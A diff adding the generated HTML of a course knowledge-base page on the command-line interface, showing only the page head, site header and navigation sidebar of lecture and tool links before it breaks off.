@@ -1,0 +1,2830 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Cybersecurity Knowledge Base for T-401-ICYB Course">
+      
+      
+        <meta name="author" content="Group 7">
+      
+      
+      
+        <link rel="prev" href="../2025-11-25%20Virtual%20Machines%20%28Fuad%20%26%20Kim%29/">
+      
+      
+        <link rel="next" href="../2025-11-27%20Operational%20Systems%20%28G%C3%ADsli%29/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>2025-11-26 Command-Line Interface (Gísli) - T-401-ICYB CySec Knowledge Base</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#2025-11-26-command-line-interface-gisli" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="T-401-ICYB CySec Knowledge Base" class="md-header__button md-logo" aria-label="T-401-ICYB CySec Knowledge Base" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            T-401-ICYB CySec Knowledge Base
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              2025-11-26 Command-Line Interface (Gísli)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/FuadPoroshtica/T-401-ICYB-CySec-Knowledge-Base" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    T-401-ICYB-CySec-Knowledge-Base
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../2025-11-24%20Introduction%20%28G%C3%ADsli%29/" class="md-tabs__link">
+          
+  
+  
+  Lecture Notes
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../Terminology/Attack%20Surface/" class="md-tabs__link">
+          
+  
+  
+  Terminology
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../Tools%20and%20Commands/Attack%20Detection%20%26%20Monitoring/Attack%20Detection%20%26%20Monitoring/" class="md-tabs__link">
+          
+  
+  
+  Tools and Commands
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../resources/All%20the%20quizzes%20and%20the%20correct%20answers/" class="md-tabs__link">
+          
+  
+  
+  Resources
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="T-401-ICYB CySec Knowledge Base" class="md-nav__button md-logo" aria-label="T-401-ICYB CySec Knowledge Base" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    T-401-ICYB CySec Knowledge Base
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/FuadPoroshtica/T-401-ICYB-CySec-Knowledge-Base" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    T-401-ICYB-CySec-Knowledge-Base
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lecture Notes
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Lecture Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-11-24%20Introduction%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-11-24 Introduction (Gísli)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-11-25%20Virtual%20Machines%20%28Fuad%20%26%20Kim%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtual Machines 2025-11-25
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-11-26 Command-Line Interface (Gísli)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-11-27%20Operational%20Systems%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Operating System Basics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-11-27%20Operational%20Systems%20%28Ivan%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-11-27 Operational Systems (Ivan)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-11-27%20Operational%20Systems%20%28Kim%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-11-27 Operational Systems (Kim)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-11-28%20Phishing%20and%20AI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-11-28 Phishing and AI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-01%20OSINT%20%26%20Networks%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSINT &amp; Networks 2025-12-01
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-02%20Networks%20-%20continuation%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-12-02 Networks (Gísli)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-03%20%20Web%20Security%20%26%20Attack%20Surfaces%20%28Fuad%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-12-03 Web Security &amp; Attack Surfaces (Fuad)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-03%20AI%20Security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-12-03 AI Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-03%20Web%20Security%20%26%20Web%20Attack%20Surfaces%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025 12 03 Web Security & Web Attack Surfaces (Gísli)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-04%20AI%20Security%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025 12 04 AI Security (Gísli)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-05%20Binary%20Exploitation%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-12-05
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-08%20Principles%20of%20Defence%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025 12 08 Principles of Defence (Gísli)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-09%20Information%20Warfare%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025 12 09 Information Warfare (Gísli)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-09%20Information%20Warfare%20-%20Computer%20System%20Security%20%28Fuad%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Warfare - Computer System Security (Fuad)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-10%20Data%20Privacy%20%28Fuad%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-12-10 Data Privacy (Fuad)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-11%20Summary%20%28Fuad%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-12-11 Summary (Fuad)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2025-12-11%20Summary%20%28G%C3%ADsli%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025-12-11 Introduction to Cyber Security Course Summary (Gísli)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_21" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_21" id="__nav_2_21_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Additional Notes
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_21_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_21">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Additional Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CLI%20Notes%20-%20Hreimur/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CLI Notes - Hreimur
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../FurtherStudies/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FurtherStudies
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IntroToCySec-Hreimur/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IntroToCySec-Hreimur
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20Notes%20-%20Hreimur/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Notes   Hreimur
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Virtualization-Hreimur/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization-Hreimur
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Terminology
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Terminology
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Terminology/Attack%20Surface/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attack Surface
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Terminology/Cyber%20Security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cyber Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Terminology/Vulnerability/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vulnerability
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Terminology/Acronyms%20cheatsheet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Acronyms cheatsheet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools and Commands
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tools and Commands
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools%20and%20Commands/Attack%20Detection%20%26%20Monitoring/Attack%20Detection%20%26%20Monitoring/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attack Detection & Monitoring
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools%20and%20Commands/Attack%20Prevention%20%26%20Hardening/Attack%20Prevention%20%26%20Hardening/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attack Prevention & Hardening
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Basic Bash Commands
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Basic Bash Commands
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools%20and%20Commands/Basic%20Bash%20commands/Basic%20Bash%20commands/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Tools%20and%20Commands/Basic%20Bash%20commands/grep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    grep
+  
+
+    
+  </span>
+  
+  
+
+      </a>
